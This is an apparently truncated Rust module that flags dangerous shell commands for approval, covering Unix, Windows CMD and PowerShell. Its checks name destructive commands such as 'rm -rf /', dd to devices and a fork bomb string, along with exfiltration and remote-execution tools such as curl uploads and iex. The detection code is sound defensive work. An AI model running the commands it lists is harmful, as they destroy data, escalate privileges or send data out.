//! Dangerous command detection.
//!
//! This module provides functionality for detecting commands that
//! are potentially dangerous and should require explicit approval.

use std::path::Path;
use std::sync::LazyLock;

use crate::parse::shell_split;

/// Patterns that indicate a dangerous command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DangerousPattern {
    /// The pattern type.
    pub kind: DangerKind,
    /// Human-readable description of why it's dangerous.
    pub reason: String,
    /// Severity level (1-5, with 5 being most severe).
    pub severity: u8,
}

/// Types of dangerous operations.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DangerKind {
    /// Destructive file operations.
    FileDestruction,
    /// System modification.
    SystemModification,
    /// Privilege escalation.
    PrivilegeEscalation,
    /// Network operations.
    NetworkExfiltration,
    /// Code execution from external source.
    RemoteCodeExecution,
    /// Disk/partition operations.
    DiskOperation,
    /// Process/service control.
    ProcessControl,
    /// Git destructive operations.
    GitDestructive,
    /// Package manager operations.
    PackageManager,
    /// Container operations.
    ContainerOperation,
    /// Generic potentially harmful.
    PotentiallyHarmful,
}

/// Dangerous command patterns with their checks.
static DANGEROUS_COMMANDS: LazyLock<Vec<DangerCheck>> = LazyLock::new(|| {
    vec![
        // File destruction
        DangerCheck {
            command: "rm",
            check: Box::new(|args| {
                // rm with -f or -r flags, especially targeting root or home
                // Only consider flags that start with -
                let has_force = args.iter().any(|a| {
                    a.starts_with('-') && a.contains('f')
                });
                let has_recursive = args.iter().any(|a| {
                    a.starts_with('-') && (a.contains('r') || a.contains('R'))
                });
                let targets_dangerous = args.iter().any(|a| {
                    let a = *a;
                    a == "/" || a == "/*" || a == "~" || a == "~/*"
                    || a.starts_with("/etc") || a.starts_with("/usr")
                    || a.starts_with("/var") || a.starts_with("/boot")
                    || a.starts_with("/home") || a.starts_with("/root")
                });

                if has_force && has_recursive && targets_dangerous {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rm -rf on system directory is extremely dangerous".to_string(),
                        severity: 5,
                    })
                } else if has_force && has_recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rm -rf can permanently delete files".to_string(),
                        severity: 3,
                    })
                } else if has_force {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rm -f bypasses confirmation".to_string(),
                        severity: 2,
                    })
                } else {
                    None
                }
            }),
        },

        // Shred/wipe
        DangerCheck {
            command: "shred",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::FileDestruction,
                    reason: "shred permanently destroys file contents".to_string(),
                    severity: 4,
                })
            }),
        },

        // Git destructive operations
        DangerCheck {
            command: "git",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("reset") => {
                        let has_hard = args.iter().any(|a| *a == "--hard");
                        Some(DangerousPattern {
                            kind: DangerKind::GitDestructive,
                            reason: if has_hard {
                                "git reset --hard discards uncommitted changes".to_string()
                            } else {
                                "git reset can modify history".to_string()
                            },
                            severity: if has_hard { 4 } else { 3 },
                        })
                    }
                    Some("rm") => Some(DangerousPattern {
                        kind: DangerKind::GitDestructive,
                        reason: "git rm removes files from repository".to_string(),
                        severity: 3,
                    }),
                    Some("push") if args.iter().any(|a| *a == "--force" || *a == "-f") => {
                        Some(DangerousPattern {
                            kind: DangerKind::GitDestructive,
                            reason: "git push --force can overwrite remote history".to_string(),
                            severity: 4,
                        })
                    }
                    Some("rebase") => Some(DangerousPattern {
                        kind: DangerKind::GitDestructive,
                        reason: "git rebase rewrites commit history".to_string(),
                        severity: 3,
                    }),
                    Some("clean") if args.iter().any(|a| *a == "-f" || *a == "-fd" || *a == "-fx") => {
                        Some(DangerousPattern {
                            kind: DangerKind::GitDestructive,
                            reason: "git clean -f removes untracked files".to_string(),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Privilege escalation
        DangerCheck {
            command: "sudo",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::PrivilegeEscalation,
                    reason: "sudo elevates privileges".to_string(),
                    severity: 4,
                })
            }),
        },
        DangerCheck {
            command: "su",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::PrivilegeEscalation,
                    reason: "su switches user identity".to_string(),
                    severity: 4,
                })
            }),
        },
        DangerCheck {
            command: "doas",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::PrivilegeEscalation,
                    reason: "doas elevates privileges".to_string(),
                    severity: 4,
                })
            }),
        },

        // Disk operations
        DangerCheck {
            command: "dd",
            check: Box::new(|args| {
                let writes_device = args.iter().any(|a| {
                    a.starts_with("of=/dev/") && !a.starts_with("of=/dev/null")
                });
                if writes_device {
                    Some(DangerousPattern {
                        kind: DangerKind::DiskOperation,
                        reason: "dd writing to device can destroy data".to_string(),
                        severity: 5,
                    })
                } else {
                    Some(DangerousPattern {
                        kind: DangerKind::DiskOperation,
                        reason: "dd is a low-level disk operation tool".to_string(),
                        severity: 3,
                    })
                }
            }),
        },
        DangerCheck {
            command: "mkfs",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "mkfs formats disk, destroying all data".to_string(),
                    severity: 5,
                })
            }),
        },
        DangerCheck {
            command: "fdisk",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "fdisk modifies disk partitions".to_string(),
                    severity: 5,
                })
            }),
        },
        DangerCheck {
            command: "parted",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "parted modifies disk partitions".to_string(),
                    severity: 5,
                })
            }),
        },

        // Permission changes
        DangerCheck {
            command: "chmod",
            check: Box::new(|args| {
                let recursive = args.iter().any(|a| *a == "-R");
                let wide_open = args.iter().any(|a| *a == "777" || *a == "a+rwx");
                let targets_root = args.iter().any(|a| *a == "/" || a.starts_with("/etc") || a.starts_with("/usr"));

                if recursive && wide_open && targets_root {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "chmod -R 777 / breaks system security".to_string(),
                        severity: 5,
                    })
                } else if recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "recursive chmod can affect many files".to_string(),
                        severity: 2,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "chown",
            check: Box::new(|args| {
                let recursive = args.iter().any(|a| *a == "-R");
                if recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "recursive chown can affect many files".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // Service control
        DangerCheck {
            command: "systemctl",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("stop") | Some("restart") | Some("disable") | Some("mask") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ProcessControl,
                            reason: format!("systemctl {} modifies system services", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    Some("enable") | Some("start") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ProcessControl,
                            reason: format!("systemctl {} can start services", args.first().unwrap()),
                            severity: 2,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Process termination
        DangerCheck {
            command: "kill",
            check: Box::new(|args| {
                let has_9 = args.iter().any(|a| *a == "-9" || *a == "-KILL");
                Some(DangerousPattern {
                    kind: DangerKind::ProcessControl,
                    reason: if has_9 {
                        "kill -9 forcefully terminates processes".to_string()
                    } else {
                        "kill terminates processes".to_string()
                    },
                    severity: if has_9 { 3 } else { 2 },
                })
            }),
        },
        DangerCheck {
            command: "killall",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::ProcessControl,
                    reason: "killall terminates multiple processes".to_string(),
                    severity: 3,
                })
            }),
        },
        DangerCheck {
            command: "pkill",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::ProcessControl,
                    reason: "pkill terminates processes by pattern".to_string(),
                    severity: 3,
                })
            }),
        },

        // Package managers
        DangerCheck {
            command: "apt",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("install") | Some("remove") | Some("purge") | Some("upgrade") => {
                        Some(DangerousPattern {
                            kind: DangerKind::PackageManager,
                            reason: format!("apt {} modifies system packages", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },
        DangerCheck {
            command: "apt-get",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("install") | Some("remove") | Some("purge") | Some("upgrade") => {
                        Some(DangerousPattern {
                            kind: DangerKind::PackageManager,
                            reason: format!("apt-get {} modifies system packages", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },
        DangerCheck {
            command: "yum",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("install") | Some("remove") | Some("update") | Some("upgrade") => {
                        Some(DangerousPattern {
                            kind: DangerKind::PackageManager,
                            reason: format!("yum {} modifies system packages", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },
        DangerCheck {
            command: "dnf",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("install") | Some("remove") | Some("upgrade") => {
                        Some(DangerousPattern {
                            kind: DangerKind::PackageManager,
                            reason: format!("dnf {} modifies system packages", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },
        DangerCheck {
            command: "pacman",
            check: Box::new(|args| {
                if args.iter().any(|a| a.starts_with("-S") || a.starts_with("-R") || a.starts_with("-U")) {
                    Some(DangerousPattern {
                        kind: DangerKind::PackageManager,
                        reason: "pacman install/remove modifies system packages".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "brew",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("install") | Some("uninstall") | Some("upgrade") | Some("link") => {
                        Some(DangerousPattern {
                            kind: DangerKind::PackageManager,
                            reason: format!("brew {} modifies packages", args.first().unwrap()),
                            severity: 2,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Container operations
        DangerCheck {
            command: "docker",
            check: Box::new(|args| {
                match args.first().map(|s| *s) {
                    Some("rm") | Some("rmi") | Some("prune") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ContainerOperation,
                            reason: format!("docker {} removes containers/images", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    Some("run") if args.iter().any(|a| *a == "--privileged" || *a == "--rm") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ContainerOperation,
                            reason: "docker run with elevated privileges".to_string(),
                            severity: 3,
                        })
                    }
                    Some("exec") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ContainerOperation,
                            reason: "docker exec runs commands in container".to_string(),
                            severity: 2,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Network tools that could exfiltrate data
        DangerCheck {
            command: "curl",
            check: Box::new(|args| {
                let has_upload = args.iter().any(|a| {
                    *a == "-d" || *a == "--data" || *a == "-F" || *a == "--form"
                    || *a == "-T" || *a == "--upload-file" || a.starts_with("-d")
                });
                let has_output = args.iter().any(|a| {
                    *a == "-o" || *a == "--output" || *a == "-O" || a.starts_with("-o")
                });

                if has_upload {
                    Some(DangerousPattern {
                        kind: DangerKind::NetworkExfiltration,
                        reason: "curl can upload data to remote server".to_string(),
                        severity: 3,
                    })
                } else if has_output {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "curl downloads files to disk".to_string(),
                        severity: 2,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "wget",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::RemoteCodeExecution,
                    reason: "wget downloads files from internet".to_string(),
                    severity: 2,
                })
            }),
        },

        // Eval and execution
        DangerCheck {
            command: "eval",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::RemoteCodeExecution,
                    reason: "eval executes arbitrary code".to_string(),
                    severity: 4,
                })
            }),
        },
        DangerCheck {
            command: "source",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::RemoteCodeExecution,
                    reason: "source executes script in current shell".to_string(),
                    severity: 3,
                })
            }),
        },

        // Special dangerous patterns
        DangerCheck {
            command: ":",
            check: Box::new(|args| {
                // Fork bomb detection: :(){ :|:& };:
                let joined = args.join("");
                if joined.contains(":|:") || joined.contains("|:&") {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "fork bomb detected - will crash system".to_string(),
                        severity: 5,
                    })
                } else {
                    None
                }
            }),
        },

        // ========================================================================
        // Windows CMD Commands
        // ========================================================================

        // Windows file deletion (del, erase)
        DangerCheck {
            command: "del",
            check: Box::new(|args| {
                let has_force = args.iter().any(|a| {
                    a.eq_ignore_ascii_case("/f") || a.eq_ignore_ascii_case("/q")
                });
                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
                let targets_system = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.starts_with("c:\\windows") || lower.starts_with("c:\\program")
                        || lower == "c:\\" || lower == "*.*"
                });

                if has_force && has_recursive && targets_system {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "del /f /s on system directory is extremely dangerous".to_string(),
                        severity: 5,
                    })
                } else if has_force && has_recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "del /f /s can permanently delete files".to_string(),
                        severity: 3,
                    })
                } else if has_force {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "del /f bypasses confirmation".to_string(),
                        severity: 2,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "erase",
            check: Box::new(|args| {
                let has_force = args.iter().any(|a| {
                    a.eq_ignore_ascii_case("/f") || a.eq_ignore_ascii_case("/q")
                });
                if has_force {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "erase /f can permanently delete files".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // Windows directory removal (rmdir, rd)
        DangerCheck {
            command: "rmdir",
            check: Box::new(|args| {
                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
                let has_quiet = args.iter().any(|a| a.eq_ignore_ascii_case("/q"));
                if has_recursive && has_quiet {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rmdir /s /q removes directories without confirmation".to_string(),
                        severity: 4,
                    })
                } else if has_recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rmdir /s removes directories recursively".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "rd",
            check: Box::new(|args| {
                let has_recursive = args.iter().any(|a| a.eq_ignore_ascii_case("/s"));
                let has_quiet = args.iter().any(|a| a.eq_ignore_ascii_case("/q"));
                if has_recursive && has_quiet {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rd /s /q removes directories without confirmation".to_string(),
                        severity: 4,
                    })
                } else if has_recursive {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "rd /s removes directories recursively".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // Windows disk operations
        DangerCheck {
            command: "format",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "format destroys all data on disk".to_string(),
                    severity: 5,
                })
            }),
        },
        DangerCheck {
            command: "diskpart",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "diskpart modifies disk partitions".to_string(),
                    severity: 5,
                })
            }),
        },

        // Windows registry modification
        DangerCheck {
            command: "reg",
            check: Box::new(|args| {
                match args.first().map(|s| s.to_lowercase()).as_deref() {
                    Some("delete") | Some("add") | Some("import") => {
                        Some(DangerousPattern {
                            kind: DangerKind::SystemModification,
                            reason: format!("reg {} modifies Windows registry", args.first().unwrap()),
                            severity: 4,
                        })
                    }
                    _ => None,
                }
            }),
        },
        DangerCheck {
            command: "regedit",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "regedit modifies Windows registry".to_string(),
                    severity: 4,
                })
            }),
        },

        // Windows privilege escalation
        DangerCheck {
            command: "runas",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::PrivilegeEscalation,
                    reason: "runas runs commands as another user".to_string(),
                    severity: 4,
                })
            }),
        },

        // Windows permission changes
        DangerCheck {
            command: "takeown",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "takeown changes file ownership".to_string(),
                    severity: 3,
                })
            }),
        },
        DangerCheck {
            command: "icacls",
            check: Box::new(|args| {
                let modifying = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.starts_with("/grant") || lower.starts_with("/deny")
                        || lower.starts_with("/remove") || lower.starts_with("/reset")
                });
                if modifying {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "icacls modifies file permissions".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "cacls",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "cacls modifies file access control lists".to_string(),
                    severity: 3,
                })
            }),
        },

        // Windows network/user management
        DangerCheck {
            command: "net",
            check: Box::new(|args| {
                match args.first().map(|s| s.to_lowercase()).as_deref() {
                    Some("user") if args.iter().any(|a| a.eq_ignore_ascii_case("/add") || a.eq_ignore_ascii_case("/delete")) => {
                        Some(DangerousPattern {
                            kind: DangerKind::SystemModification,
                            reason: "net user modifies user accounts".to_string(),
                            severity: 4,
                        })
                    }
                    Some("localgroup") if args.iter().any(|a| a.eq_ignore_ascii_case("/add") || a.eq_ignore_ascii_case("/delete")) => {
                        Some(DangerousPattern {
                            kind: DangerKind::SystemModification,
                            reason: "net localgroup modifies group membership".to_string(),
                            severity: 4,
                        })
                    }
                    Some("share") => {
                        Some(DangerousPattern {
                            kind: DangerKind::NetworkExfiltration,
                            reason: "net share modifies network shares".to_string(),
                            severity: 3,
                        })
                    }
                    Some("stop") | Some("start") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ProcessControl,
                            reason: format!("net {} modifies services", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Windows service control
        DangerCheck {
            command: "sc",
            check: Box::new(|args| {
                match args.first().map(|s| s.to_lowercase()).as_deref() {
                    Some("delete") | Some("create") | Some("config") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ProcessControl,
                            reason: format!("sc {} modifies Windows services", args.first().unwrap()),
                            severity: 4,
                        })
                    }
                    Some("stop") | Some("start") => {
                        Some(DangerousPattern {
                            kind: DangerKind::ProcessControl,
                            reason: format!("sc {} controls services", args.first().unwrap()),
                            severity: 3,
                        })
                    }
                    _ => None,
                }
            }),
        },

        // Windows scheduled tasks
        DangerCheck {
            command: "schtasks",
            check: Box::new(|args| {
                let modifying = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower == "/create" || lower == "/delete" || lower == "/change"
                });
                if modifying {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "schtasks modifies scheduled tasks".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // Windows Management Instrumentation
        DangerCheck {
            command: "wmic",
            check: Box::new(|args| {
                let has_delete = args.iter().any(|a| a.eq_ignore_ascii_case("delete"));
                let has_process_call = args.iter().any(|a| a.eq_ignore_ascii_case("call"));
                if has_delete {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "wmic delete can remove system components".to_string(),
                        severity: 4,
                    })
                } else if has_process_call {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "wmic call can execute arbitrary commands".to_string(),
                        severity: 4,
                    })
                } else {
                    None
                }
            }),
        },

        // Windows Secure Delete
        DangerCheck {
            command: "cipher",
            check: Box::new(|args| {
                let has_wipe = args.iter().any(|a| a.eq_ignore_ascii_case("/w"));
                if has_wipe {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "cipher /w securely wipes free space".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // Windows shutdown/restart
        DangerCheck {
            command: "shutdown",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::ProcessControl,
                    reason: "shutdown can restart or power off the system".to_string(),
                    severity: 3,
                })
            }),
        },

        // ========================================================================
        // PowerShell Commands
        // ========================================================================

        // PowerShell execution
        DangerCheck {
            command: "powershell",
            check: Box::new(|args| {
                let has_exec = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower == "-command" || lower == "-c" || lower == "-encodedcommand"
                        || lower == "-e" || lower == "-file" || lower == "-f"
                });
                if has_exec {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "powershell executes commands or scripts".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "powershell.exe",
            check: Box::new(|args| {
                let has_exec = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower == "-command" || lower == "-c" || lower == "-encodedcommand"
                        || lower == "-e" || lower == "-file" || lower == "-f"
                });
                if has_exec {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "powershell.exe executes commands or scripts".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "pwsh",
            check: Box::new(|args| {
                let has_exec = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower == "-command" || lower == "-c" || lower == "-file" || lower == "-f"
                });
                if has_exec {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "pwsh (PowerShell Core) executes commands".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },

        // PowerShell file deletion
        DangerCheck {
            command: "Remove-Item",
            check: Box::new(|args| {
                let has_force = args.iter().any(|a| a.eq_ignore_ascii_case("-Force"));
                let has_recurse = args.iter().any(|a| a.eq_ignore_ascii_case("-Recurse"));
                if has_force && has_recurse {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "Remove-Item -Recurse -Force permanently deletes files".to_string(),
                        severity: 4,
                    })
                } else if has_force || has_recurse {
                    Some(DangerousPattern {
                        kind: DangerKind::FileDestruction,
                        reason: "Remove-Item can delete files".to_string(),
                        severity: 2,
                    })
                } else {
                    None
                }
            }),
        },

        // PowerShell content modification
        DangerCheck {
            command: "Clear-Content",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::FileDestruction,
                    reason: "Clear-Content erases file contents".to_string(),
                    severity: 3,
                })
            }),
        },

        // PowerShell execution policy
        DangerCheck {
            command: "Set-ExecutionPolicy",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "Set-ExecutionPolicy changes script execution security".to_string(),
                    severity: 4,
                })
            }),
        },

        // PowerShell arbitrary code execution
        DangerCheck {
            command: "Invoke-Expression",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::RemoteCodeExecution,
                    reason: "Invoke-Expression executes arbitrary code".to_string(),
                    severity: 5,
                })
            }),
        },
        DangerCheck {
            command: "iex",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::RemoteCodeExecution,
                    reason: "iex (Invoke-Expression) executes arbitrary code".to_string(),
                    severity: 5,
                })
            }),
        },

        // PowerShell downloads
        DangerCheck {
            command: "Invoke-WebRequest",
            check: Box::new(|args| {
                let has_outfile = args.iter().any(|a| a.eq_ignore_ascii_case("-OutFile"));
                if has_outfile {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "Invoke-WebRequest downloads files from internet".to_string(),
                        severity: 3,
                    })
                } else {
                    Some(DangerousPattern {
                        kind: DangerKind::NetworkExfiltration,
                        reason: "Invoke-WebRequest accesses remote resources".to_string(),
                        severity: 2,
                    })
                }
            }),
        },
        DangerCheck {
            command: "Invoke-RestMethod",
            check: Box::new(|args| {
                let has_body = args.iter().any(|a| a.eq_ignore_ascii_case("-Body"));
                if has_body {
                    Some(DangerousPattern {
                        kind: DangerKind::NetworkExfiltration,
                        reason: "Invoke-RestMethod can upload data".to_string(),
                        severity: 3,
                    })
                } else {
                    Some(DangerousPattern {
                        kind: DangerKind::NetworkExfiltration,
                        reason: "Invoke-RestMethod accesses remote APIs".to_string(),
                        severity: 2,
                    })
                }
            }),
        },

        // PowerShell registry modification
        DangerCheck {
            command: "Set-ItemProperty",
            check: Box::new(|args| {
                let targets_registry = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.contains("hklm:") || lower.contains("hkcu:")
                        || lower.contains("registry::")
                });
                if targets_registry {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "Set-ItemProperty modifies Windows registry".to_string(),
                        severity: 4,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "New-ItemProperty",
            check: Box::new(|args| {
                let targets_registry = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.contains("hklm:") || lower.contains("hkcu:")
                });
                if targets_registry {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "New-ItemProperty creates registry entries".to_string(),
                        severity: 4,
                    })
                } else {
                    None
                }
            }),
        },

        // PowerShell service control
        DangerCheck {
            command: "Stop-Service",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::ProcessControl,
                    reason: "Stop-Service can stop critical services".to_string(),
                    severity: 3,
                })
            }),
        },
        DangerCheck {
            command: "Remove-Service",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "Remove-Service deletes Windows services".to_string(),
                    severity: 4,
                })
            }),
        },

        // PowerShell user management
        DangerCheck {
            command: "Add-LocalGroupMember",
            check: Box::new(|args| {
                let adds_to_admin = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.contains("administrators")
                });
                if adds_to_admin {
                    Some(DangerousPattern {
                        kind: DangerKind::PrivilegeEscalation,
                        reason: "Add-LocalGroupMember adds user to Administrators".to_string(),
                        severity: 5,
                    })
                } else {
                    Some(DangerousPattern {
                        kind: DangerKind::SystemModification,
                        reason: "Add-LocalGroupMember modifies group membership".to_string(),
                        severity: 3,
                    })
                }
            }),
        },
        DangerCheck {
            command: "New-LocalUser",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::SystemModification,
                    reason: "New-LocalUser creates local user accounts".to_string(),
                    severity: 4,
                })
            }),
        },

        // PowerShell process execution
        DangerCheck {
            command: "Start-Process",
            check: Box::new(|args| {
                let has_verb_runas = args.iter().any(|a| {
                    let lower = a.to_lowercase();
                    lower.contains("-verb") && args.iter().any(|b| b.eq_ignore_ascii_case("runas"))
                });
                if has_verb_runas {
                    Some(DangerousPattern {
                        kind: DangerKind::PrivilegeEscalation,
                        reason: "Start-Process with -Verb RunAs elevates privileges".to_string(),
                        severity: 4,
                    })
                } else {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "Start-Process launches external programs".to_string(),
                        severity: 2,
                    })
                }
            }),
        },

        // PowerShell disk operations
        DangerCheck {
            command: "Format-Volume",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "Format-Volume destroys all data on volume".to_string(),
                    severity: 5,
                })
            }),
        },
        DangerCheck {
            command: "Clear-Disk",
            check: Box::new(|_| {
                Some(DangerousPattern {
                    kind: DangerKind::DiskOperation,
                    reason: "Clear-Disk removes all partitions from disk".to_string(),
                    severity: 5,
                })
            }),
        },

        // CMD.exe execution
        DangerCheck {
            command: "cmd",
            check: Box::new(|args| {
                let has_exec = args.iter().any(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"));
                if has_exec {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "cmd /c executes commands".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
        DangerCheck {
            command: "cmd.exe",
            check: Box::new(|args| {
                let has_exec = args.iter().any(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"));
                if has_exec {
                    Some(DangerousPattern {
                        kind: DangerKind::RemoteCodeExecution,
                        reason: "cmd.exe /c executes commands".to_string(),
                        severity: 3,
                    })
                } else {
                    None
                }
            }),
        },
    ]
});

struct DangerCheck {
    command: &'static str,
    check: Box<dyn Fn(&[&str]) -> Option<DangerousPattern> + Send + Sync>,
}

/// Check if a command might be dangerous.
///
/// This function performs pattern-based detection of potentially
/// dangerous commands that should require explicit approval.
///
/// # Arguments
///
/// * `command` - The command as a slice of strings (program + arguments)
///
/// # Returns
///
/// `true` if the command is potentially dangerous, `false` otherwise.
///
/// # Example
///
/// ```rust
/// use mms_shell::command_safety::is_dangerous_command;
///
/// assert!(is_dangerous_command(&["rm", "-rf", "/"]));
/// assert!(is_dangerous_command(&["sudo", "apt", "install", "foo"]));
/// assert!(!is_dangerous_command(&["ls", "-la"]));
/// ```
pub fn is_dangerous_command(command: &[&str]) -> bool {
    is_dangerous_to_exec(command).is_some()
}

/// Check if a command is dangerous with detailed result.
///
/// Returns information about why the command is dangerous.
///
/// # Arguments
///
/// * `command` - The command as a slice of strings
///
/// # Returns
///
/// `Some(DangerousPattern)` if dangerous, `None` if not.
pub fn is_dangerous_to_exec(command: &[&str]) -> Option<DangerousPattern> {
    if command.is_empty() {
        return None;
    }

    // Check for shell chain
    if let Some(script) = extract_shell_script(command) {
